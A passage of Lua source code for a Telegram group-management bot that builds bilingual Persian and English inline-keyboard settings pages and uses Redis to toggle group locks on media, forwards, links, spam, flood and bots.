              text = "(\216\181\217\129\216\173\217\135 3)\n `\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\218\175\216\177\217\136\217\135: " .. mute_all,
                    callback_data = "mute_all:" .. chat
                  },
                  {
                    text = "\218\175\219\140\217\129: " .. mute_gif,
                    callback_data = "mute_gif:" .. chat
                  }
                },
                {
                  {
                    text = "\217\133\216\170\217\134: " .. mute_text,
                    callback_data = "mute_text:" .. chat
                  },
                  {
                    text = "\216\185\218\169\216\179: " .. mute_photo,
                    callback_data = "mute_photo:" .. chat
                  }
                },
                {
                  {
                    text = "\217\129\219\140\217\132\217\133: " .. mute_video,
                    callback_data = "mute_video:" .. chat
                  },
                  {
                    text = "\216\162\217\135\217\134\218\175: " .. mute_audio,
                    callback_data = "mute_audio:" .. chat
                  }
                },
                {
                  {
                    text = "\216\181\216\175\216\167: " .. mute_voice,
                    callback_data = "mute_voice:" .. chat
                  },
                  {
                    text = "\216\167\216\179\216\170\219\140\218\169\216\177: " .. mute_sticker,
                    callback_data = "mute_sticker:" .. chat
                  }
                },
                {
                  {
                    text = "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140: " .. lock_note,
                    callback_data = "lock_note:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "4\239\184\143\226\131\163",
                    callback_data = "Settings4:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          function GetSettings4(msg, chat)
            local mute_contact = "\240\159\148\147"
            local mute_forward = "\240\159\148\147"
            local mute_location = "\240\159\148\147"
            local mute_document = "\240\159\148\147"
            local mute_tgservice = "\240\159\148\147"
            local mute_inline = "\240\159\148\147"
            local mute_game = "\240\159\148\147"
            local mute_keyboard = "\240\159\148\147"
            local lock_username = "\240\159\148\147"
            local lock_join = "\240\159\148\147"
            if redis:hget("GroupSettings:" .. chat, "mute_contact") == "yes" then
              mute_contact = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_forward") == "yes" then
              mute_forward = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_location") == "yes" then
              mute_location = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_document") == "yes" then
              mute_document = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_tgservice") == "yes" then
              mute_tgservice = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_inline") == "yes" then
              mute_inline = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_game") == "yes" then
              mute_game = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "mute_keyboard") == "yes" then
              mute_keyboard = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_username") == "yes" then
              lock_username = "\240\159\148\144"
            end
            if redis:hget("GroupSettings:" .. chat, "lock_join") == "yes" then
              lock_join = "\240\159\148\144"
            end
            keyboard = {}
            if not lang then
              text = "(*Page 4*) `Please Use An item For Change Status:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Forward: " .. mute_forward,
                    callback_data = "mute_forward:" .. chat
                  },
                  {
                    text = "Contact: " .. mute_contact,
                    callback_data = "mute_contact:" .. chat
                  }
                },
                {
                  {
                    text = "Document: " .. mute_document,
                    callback_data = "mute_document:" .. chat
                  },
                  {
                    text = "Location: " .. mute_location,
                    callback_data = "mute_location:" .. chat
                  }
                },
                {
                  {
                    text = "Game: " .. mute_game,
                    callback_data = "mute_game:" .. chat
                  },
                  {
                    text = "Keyboard: " .. mute_keyboard,
                    callback_data = "mute_keyboard:" .. chat
                  }
                },
                {
                  {
                    text = "Tgservice: " .. mute_tgservice,
                    callback_data = "mute_tgservice:" .. chat
                  },
                  {
                    text = "inline: " .. mute_inline,
                    callback_data = "mute_inline:" .. chat
                  }
                },
                {
                  {
                    text = "UserName: " .. lock_username,
                    callback_data = "lock_username:" .. chat
                  },
                  {
                    text = "Join: " .. lock_join,
                    callback_data = "lock_join:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "(\216\181\217\129\216\173\217\135 4)\n `\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\133\216\174\216\167\216\183\216\168: " .. mute_contact,
                    callback_data = "mute_contact:" .. chat
                  },
                  {
                    text = "\217\129\217\136\216\177\217\136\216\167\216\177\216\175: " .. mute_forward,
                    callback_data = "mute_forward:" .. chat
                  }
                },
                {
                  {
                    text = "\217\133\218\169\216\167\217\134: " .. mute_location,
                    callback_data = "mute_location:" .. chat
                  },
                  {
                    text = "\217\129\216\167\219\140\217\132: " .. mute_document,
                    callback_data = "mute_document:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\167\216\178\219\140: " .. mute_game,
                    callback_data = "mute_game:" .. chat
                  },
                  {
                    text = "\218\169\219\140\216\168\217\136\216\177\216\175: " .. mute_keyboard,
                    callback_data = "mute_keyboard:" .. chat
                  }
                },
                {
                  {
                    text = "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133: " .. mute_tgservice,
                    callback_data = "mute_tgservice:" .. chat
                  },
                  {
                    text = "\216\167\219\140\217\134\217\132\216\167\219\140\217\134: " .. mute_inline,
                    callback_data = "mute_inline:" .. chat
                  }
                },
                {
                  {
                    text = "\219\140\217\136\216\178\216\177\217\134\219\140\217\133: " .. lock_username,
                    callback_data = "lock_username:" .. chat
                  },
                  {
                    text = "\217\136\216\177\217\136\216\175: " .. lock_join,
                    callback_data = "lock_join:" .. chat
                  }
                },
                {
                  {
                    text = "1\239\184\143\226\131\163",
                    callback_data = "Settings:" .. chat
                  },
                  {
                    text = "2\239\184\143\226\131\163",
                    callback_data = "Settings2:" .. chat
                  },
                  {
                    text = "3\239\184\143\226\131\163",
                    callback_data = "Settings3:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Settings" then
            GetSettings(msg, matches[2])
            if not lang then
              get_alert(msg.cb_id, "Lock items > Page 1")
            else
              get_alert(msg.cb_id, "\216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132 > \216\181\217\129\216\173\217\135 1")
            end
          end
          if matches[1] == "Settings2" then
            GetSettings2(msg, matches[2])
            if not lang then
              get_alert(msg.cb_id, "Lock items > Page 2")
            else
              get_alert(msg.cb_id, "\216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132 > \216\181\217\129\216\173\217\135 2")
            end
          end
          if matches[1] == "Settings3" then
            GetSettings3(msg, matches[2])
            if not lang then
              get_alert(msg.cb_id, "Lock items > Page 3")
            else
              get_alert(msg.cb_id, "\216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132 > \216\181\217\129\216\173\217\135 3")
            end
          end
          if matches[1] == "Settings4" then
            GetSettings4(msg, matches[2])
            if not lang then
              get_alert(msg.cb_id, "Lock items > Page 4")
            else
              get_alert(msg.cb_id, "\216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132 > \216\181\217\129\216\173\217\135 4")
            end
          end
          if matches[1] == "Manager" then
            keyboard = {}
            if not lang then
              text = "Welcome To `" .. matches[2] .. "` Group Manager"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\148\145 Locks items Part",
                    callback_data = "Settings:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\148\162 Number items Part",
                    callback_data = "NumberSettings:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\156\150\239\184\143 Clean Part",
                    callback_data = "Cleans:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\151\130 info Part",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\155\160 other Tools",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\145\164 Support Part",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "[ Close ]",
                    callback_data = "Exit:" .. matches[2]
                  }
                }
              }
            else
              text = "\216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \218\175\216\177\217\136\217\135 `" .. matches[2] .. "` \216\174\217\136\216\180 \216\162\217\133\216\175\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\148\145 \216\168\216\174\216\180 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132",
                    callback_data = "Settings:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\148\162 \216\168\216\174\216\180 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140",
                    callback_data = "NumberSettings:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\156\150\239\184\143 \216\168\216\174\216\180 \217\190\216\167\218\169\216\179\216\167\216\178\219\140",
                    callback_data = "Cleans:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\151\130 \216\168\216\174\216\180 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135",
                    callback_data = "Info:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\155\160 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\145\164 \216\168\216\174\216\180 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "[ \216\168\216\179\216\170\217\134 ]",
                    callback_data = "Exit:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "NoProcess" then
            if not lang then
              get_alert(msg.cb_id, "No Process Found!")
            else
              get_alert(msg.cb_id, "\217\129\216\177\216\162\219\140\217\134\216\175\219\140 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175!")
            end
          end
          if matches[1] == "Exit" then
            redis:del("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])
            if not lang then
              text = "Manager of `" .. matches[2] .. "` Group Has Been Closed By " .. msg.from.name
            else
              text = "\217\133\216\175\219\140\216\177\219\140\216\170 \218\175\216\177\217\136\217\135 `" .. matches[2] .. "` \216\170\217\136\216\179\216\183 " .. msg.from.name .. " \216\168\216\179\216\170\217\135 \216\180\216\175"
            end
            edit_inline(msg.message_id, text)
          end
          if matches[1] == "mute_all" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "All Unlocked")
              else
                get_alert(msg.cb_id, "\218\134\216\170 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "All Locked")
              else
                get_alert(msg.cb_id, "\218\134\216\170 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_gif" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Gif Unlocked")
              else
                get_alert(msg.cb_id, "\218\175\219\140\217\129 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Gif Locked")
              else
                get_alert(msg.cb_id, "\218\175\219\140\217\129 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_text" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Text Unlocked")
              else
                get_alert(msg.cb_id, "\217\133\216\170\217\134 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Text Locked")
              else
                get_alert(msg.cb_id, "\217\133\216\170\217\134 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_photo" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Photo Unlocked")
              else
                get_alert(msg.cb_id, "\216\185\218\169\216\179 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Photo Locked")
              else
                get_alert(msg.cb_id, "\216\185\218\169\216\179 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_video" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Video Unlocked")
              else
                get_alert(msg.cb_id, "\217\129\219\140\217\132\217\133 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Video Locked")
              else
                get_alert(msg.cb_id, "\217\129\219\140\217\132\217\133 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_audio" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Audio Unlocked")
              else
                get_alert(msg.cb_id, "\216\162\217\135\217\134\218\175 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Audio Locked")
              else
                get_alert(msg.cb_id, "\216\162\217\135\217\134\218\175 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_voice" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Voice Unlocked")
              else
                get_alert(msg.cb_id, "\216\181\216\175\216\167 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Voice Locked")
              else
                get_alert(msg.cb_id, "\216\181\216\175\216\167 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_sticker" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Sticker Unlocked")
              else
                get_alert(msg.cb_id, "\216\167\216\179\216\170\219\140\218\169\216\177 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Sticker Locked")
              else
                get_alert(msg.cb_id, "\216\167\216\179\216\170\219\140\218\169\216\177 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "lock_note" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Video Note Unlocked")
              else
                get_alert(msg.cb_id, "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Video Note Locked")
              else
                get_alert(msg.cb_id, "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings3(msg, matches[2])
          end
          if matches[1] == "mute_contact" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Contact Unlocked")
              else
                get_alert(msg.cb_id, "\217\133\216\174\216\167\216\183\216\168 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Contact Locked")
              else
                get_alert(msg.cb_id, "\217\133\216\174\216\167\216\183\216\168 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_forward" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Forward Unlocked")
              else
                get_alert(msg.cb_id, "\217\129\217\136\216\177\217\136\216\167\216\177\216\175 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Forward Locked")
              else
                get_alert(msg.cb_id, "\217\129\217\136\216\177\217\136\216\167\216\177\216\175 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_location" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Location Unlocked")
              else
                get_alert(msg.cb_id, "\217\133\218\169\216\167\217\134 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Location Locked")
              else
                get_alert(msg.cb_id, "\217\133\218\169\216\167\217\134 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_document" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Document Unlocked")
              else
                get_alert(msg.cb_id, "\217\129\216\167\219\140\217\132 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Document Locked")
              else
                get_alert(msg.cb_id, "\217\129\216\167\219\140\217\132 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_tgservice" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Tgservice Unlocked")
              else
                get_alert(msg.cb_id, "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Tgservice Locked")
              else
                get_alert(msg.cb_id, "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_inline" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "inline Unlocked")
              else
                get_alert(msg.cb_id, "\216\167\219\140\217\134\217\132\216\167\219\140\217\134 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "inline Locked")
              else
                get_alert(msg.cb_id, "\216\167\219\140\217\134\217\132\216\167\219\140\217\134 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_game" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Game Unlocked")
              else
                get_alert(msg.cb_id, "\216\168\216\167\216\178\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Game Locked")
              else
                get_alert(msg.cb_id, "\216\168\216\167\216\178\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "mute_keyboard" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Keyboard Unlocked")
              else
                get_alert(msg.cb_id, "\218\169\219\140\216\168\217\136\216\177\216\175 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Keyboard Locked")
              else
                get_alert(msg.cb_id, "\218\169\219\140\216\168\217\136\216\177\216\175 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "lock_link" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Link Unlocked")
              else
                get_alert(msg.cb_id, "\217\132\219\140\217\134\218\169 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Link Locked")
              else
                get_alert(msg.cb_id, "\217\132\219\140\217\134\218\169 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_tag" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Tag Unlocked")
              else
                get_alert(msg.cb_id, "\216\170\218\175 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Tag Locked")
              else
                get_alert(msg.cb_id, "\216\170\218\175 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_username" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "UserName Unlocked")
              else
                get_alert(msg.cb_id, "\219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "UserName Locked")
              else
                get_alert(msg.cb_id, "\219\140\217\136\216\178\216\177\217\134\219\140\217\133 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "lock_join" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Join Unlocked")
              else
                get_alert(msg.cb_id, "\217\136\216\177\217\136\216\175 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Join Locked")
              else
                get_alert(msg.cb_id, "\217\136\216\177\217\136\216\175 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings4(msg, matches[2])
          end
          if matches[1] == "lock_mention" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Mention Unlocked")
              else
                get_alert(msg.cb_id, "\217\133\217\134\216\180\217\134 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Mention Locked")
              else
                get_alert(msg.cb_id, "\217\133\217\134\216\180\217\134 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_arabic" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Arabic Unlocked")
              else
                get_alert(msg.cb_id, "\216\185\216\177\216\168\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Arabic Locked")
              else
                get_alert(msg.cb_id, "\216\185\216\177\216\168\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_edit" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Edit Unlocked")
              else
                get_alert(msg.cb_id, "\216\167\216\175\219\140\216\170 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Edit Locked")
              else
                get_alert(msg.cb_id, "\216\167\216\175\219\140\216\170 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
            if not lang then
              get_alert(msg.cb_id, "Lock items > Page 1")
            else
              get_alert(msg.cb_id, "\216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \217\130\217\129\217\132 > \216\181\217\129\216\173\217\135 1")
            end
          end
          if matches[1] == "lock_spam" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Spam Unlocked")
              else
                get_alert(msg.cb_id, "\216\167\216\179\217\190\217\133 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Spam Locked")
              else
                get_alert(msg.cb_id, "\216\167\216\179\217\190\217\133 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_flood" then
            if redis:hget("GroupSettings:" .. matches[2], "flood") == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], "flood")
              if not lang then
                get_alert(msg.cb_id, "Flood Unlocked")
              else
                get_alert(msg.cb_id, "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], "flood", "yes")
              if not lang then
                get_alert(msg.cb_id, "Flood Locked")
              else
                get_alert(msg.cb_id, "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_bots" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Bots Unlocked")
              else
                get_alert(msg.cb_id, "\216\177\216\168\216\167\216\170 \217\135\216\167 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
